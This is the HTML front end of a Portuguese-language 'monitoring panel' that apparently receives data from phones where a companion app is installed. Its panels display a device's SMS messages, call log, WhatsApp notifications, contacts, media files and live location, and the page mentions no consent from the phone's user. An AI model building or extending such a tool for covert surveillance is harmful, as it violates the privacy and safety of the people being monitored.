<!doctype html>
<html lang="pt">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Mabuie — Painel de Monitoramento</title>

  <!-- Leaflet -->
  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />

  <!-- Styles -->
  <link rel="stylesheet" href="styles.css" />

  <!-- Icons (simple) -->
</head>
<body>
  <header class="topbar">
    <div class="brand">Mabuie <span class="muted">Painel</span></div>

    <div class="right">
      <div id="userLabel" class="userLabel hidden"></div>
      <button id="btnLogout" class="btn small hidden">Sair</button>
    </div>
  </header>

  <main class="container">
    <aside class="sidebar">
      <div id="loginBox" class="card loginCard">
        <h2>Entrar / Registar</h2>
        <input id="username" placeholder="Usuário" autocomplete="username" />
        <input id="password" type="password" placeholder="Senha" autocomplete="current-password" />
        <div class="row">
          <button id="btnLogin" class="btn">Entrar</button>
          <button id="btnRegister" class="btn alt">Registar</button>
        </div>
        <p id="loginMsg" class="msg"></p>
      </div>

      <div id="dashboardPanel" class="hidden">
        <div class="card">
          <h3>Controle</h3>
          <div class="menu">
            <button class="menuBtn" data-show="devicesSection">📱 Dispositivos</button>
            <button class="menuBtn" data-show="messagesSection">✉️ Mensagens</button>
            <button class="menuBtn" data-show="callsSection">📞 Chamadas</button>
            <button class="menuBtn" data-show="notifsSection">🔔 Notificações</button>
            <button class="menuBtn" data-show="contactsSection">📇 Contactos</button>
            <button class="menuBtn" data-show="mediaSection">📁 Media</button>
            <button class="menuBtn" data-show="mapSection">🗺️ Mapa</button>
          </div>
        </div>

        <div class="card">
          <h4>Registrar dispositivo</h4>
          <input id="deviceIdInput" placeholder="Device ID (do app)" />
          <input id="deviceLabelInput" placeholder="Etiqueta (ex: SM-A035F)" />
          <button id="btnRegisterDevice" class="btn small">Registar Device</button>
          <p id="deviceMsg" class="msg"></p>
        </div>
      </div>
    </aside>

    <section class="content">
      <!-- Devices -->
      <section id="devicesSection" class="card panel">
        <h3>Dispositivos</h3>
        <div id="devicesList">Carregando...</div>
      </section>

      <!-- Messages -->
      <section id="messagesSection" class="card panel hidden">
        <h3>Mensagens (SMS)</h3>
        <ul id="smsList" class="list"></ul>
      </section>

      <!-- Calls -->
      <section id="callsSection" class="card panel hidden">
        <h3>Chamadas</h3>
        <ul id="callsList" class="list"></ul>
      </section>

      <!-- Notifications -->
      <section id="notifsSection" class="card panel hidden">
        <h3>Notificações (WhatsApp etc.)</h3>
        <ul id="notifList" class="list"></ul>
      </section>

      <!-- Contacts -->
      <section id="contactsSection" class="card panel hidden">
        <h3>Contactos</h3>
        <ul id="contactsList" class="list"></ul>
      </section>

      <!-- Media -->
      <section id="mediaSection" class="card panel hidden">
        <h3>Media</h3>
        <div id="mediaList">Carregando...</div>
        <div id="mediaViewer" class="mediaViewer hidden">
          <div id="mediaPreview"></div>
          <div class="row">
            <button id="mediaDownloadBtn" class="btn small">Download</button>
            <button id="mediaCloseBtn" class="btn alt small">Fechar</button>
          </div>
        </div>
      </section>

      <!-- Map -->
      <section id="mapSection" class="card panel hidden">
        <h3>Mapa — Histórico / Localização em tempo real</h3>
        <div id="map" style="height:480px;"></div>
      </section>

    </section>
  </main>

  <!-- Socket.io -->
  <script src="/socket.io/socket.io.js"></script>
  <!-- Leaflet -->
  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
  <!-- App script -->
  <script src="scripts/main.js"></script>
</body>
          </html>
